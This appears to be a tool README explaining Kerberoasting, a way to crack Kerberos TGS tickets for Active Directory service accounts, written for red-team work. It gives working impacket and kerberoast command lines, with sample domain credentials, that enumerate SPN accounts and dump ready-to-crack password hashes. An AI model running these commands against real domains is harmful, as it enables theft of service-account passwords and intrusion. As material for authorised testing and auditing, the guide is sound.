"THE BEER-WARE LICENSE" (Revision 42)
=====================================
<jean-christophe.delaunay (at) synacktiv.com> wrote this file.  As long as you
retain this notice you can do whatever you want with this stuff. If we meet
some day, and you think this stuff is worth it, you can buy me a beer in
return.   Fist0urs


Cracking Kerberos Ticket Granting Service (TGS) tickets within _Microsoft Active Directory_
===========================================================================================

(Skip to part "How to retrieve TGS tickets" if you just want to know how to get TGS to crack).

What is it
----------

Within a _Micorosft Active Directory_ environment, registered services (as MsSQL or so) rely on a domain account in order to be functional.
This domain account should be a service account but administrators can provided whichever account they want provided that it has sufficient rights.
Such specific accounts are easily identifiable by their LDAP attribute _servicePrincipalName_ (SPN) and can be listed by *any authenticated user* in the domain (whatever are his rights in the domain).
Furthermore any authenticated can request a TGS ticket for these accounts. Nevertheless, if one can request such tickets, it does not mean that he would be able to impersonate these accounts.
Indeed, the important part assuring that a user submitting a ticket is its legit owner is encrypted with a key. This key is derived from a secret only known by the legit account which is its **domain account password**. This attack is known as "Kerberoast" and was discovered by Tim Medin.

So, having a valid domain user, one can request tickets for accounts having a SPN and try to retrieve the corresponding passwords.

Algorithm details
-----------------

_Active Directory_ offers 4 algorithms to generate the encryption key:

* DES (disabled by default, not really usefull)
* RC4-HMAC-MD5 (enctype 23)
* AES128-CTS-HMAC-SHA1-96 (enctype 17) - with 4096 PBKDF2 HMAC-SHA1 iterations
* AES256-CTS-HMAC-SHA1-96 (enctype 18) - same number of algo/iterations

At the moment only etype 23 is implement within john but etype 17 and 18 are yet to come.

How to retrieve TGS tickets
---------------------------

_GetUserSPNs.py_ from [impacket](https://github.com/SecureAuthCorp/impacket) by @asolino permits to obtain these tickets:

```

usage: GetUserSPNs.py [-h] [-target-domain TARGET_DOMAIN] [-request]
                      [-request-user username] [-save]
                      [-outputfile OUTPUTFILE] [-debug]
                      [-hashes LMHASH:NTHASH] [-no-pass] [-k]
                      [-aesKey hex key] [-dc-ip ip address]
                      target

Queries target domain for SPNs that are running under a user account

positional arguments:
  target                domain/username[:password]

```

Provided my domain is CONTOSO, username is "fistouille" and password "kariontounu", requesting tickets would be as follows:

```

$ python GetUserSPNs.py -target-domain CONTOSO -request -outputfile KRB5TGS.dump CONTOSO/fistouille:kariontounu

```

**_KRB5TGS.dump_ now contains ready-to-crack hashes for both JtR and hashcat**

Another tool, [kerberoast](https://github.com/skelsec/kerberoast) from @skelsec, offers the ability to retrieve such tickets (among many other things).

You can get it from [github](https://github.com/skelsec/kerberoast) or install it with **pip3** (_Python 3.6_ is required):

```

$ git clone https://github.com/skelsec/kerberoast
$ python3 setup.py install

OR

$ pip3 install -r requirements.txt
$ pip3 install kerberoast

```

Usage:

```

usage: kerberoast.py [-h] [-v]
                     {ldap,brute,asreproast,spnroast,spnroast-sspi,auto} ...

Tool to perform kerberoast attack against service users in MS Active Directory

positional arguments:
  {ldap,brute,asreproast,spnroast,spnroast-sspi,auto}
                        commands
    ldap                Enumerate potentially vulnerable users via LDAP
    brute               Enumerate users via brute-forcing kerberos service
    asreproast          Perform asrep roasting
    spnroast            Perform spn roasting (aka kerberoasting)
    spnroast-sspi       Perform spn roasting (aka kerberoasting)
    auto                Just get the tickets already. Only works on windows
                        under any domain-user context

```

Provided the aforementioned information plus a _Domain Controller_ IP/FQDN (eg. 10.123.42.42), we can request tickets as follows:

```

# we first list all user accounts having an SPN
$ python3 kerberoast.py ldap all CONTOSO/fistouille:kariontounu@10.123.42.42 -o ldapenum

# we then ask for TGS for these accounts
$ python3 kerberoast.py spnroast CONTOSO/fistouille:kariontounu@10.123.42.42 -t ldapenum_spn_users.txt

```

**_ldapenum_spn_users.txt_ now contains ready-to-crack hashes for both JtR and hashcat**

Finally, _kerberoast_ python tool also implements Windows implicit authentication mechanism which is really useful during _Red Team_ security assessments.
